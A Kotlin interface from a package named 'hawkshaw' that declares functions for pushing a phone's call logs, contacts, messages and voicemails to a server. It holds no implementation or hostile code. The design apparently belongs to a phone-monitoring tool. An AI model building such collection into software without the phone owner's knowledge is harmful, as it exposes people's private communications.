package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.*
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse

/**
 * Service for handling telephony operations
 */
interface TelephonyService {
    /**
     * Push call logs to the server
     * 
     * @param request The call logs data to push
     * @return The response from the server
     */
    suspend fun pushCallLogs(request: PushCallLogsRequest): ApiResponse<PushCallLogsResponse>
    
    /**
     * Push contacts to the server
     * 
     * @param request The contacts data to push
     * @return The response from the server
     */
    suspend fun pushContacts(request: PushContactsRequest): ApiResponse<PushContactsResponse>
    
    /**
     * Push messages to the server
     * 
     * @param request The messages data to push
     * @return The response from the server
     */
    suspend fun pushMessages(request: PushMessagesRequest): ApiResponse<PushMessagesResponse>
    
    /**
     * Push voicemails to the server
     * 
     * @param request The voicemails data to push
     * @return The response from the server
     */
    suspend fun pushVoicemails(request: PushVoicemailsRequest): ApiResponse<PushVoicemailsResponse>
} 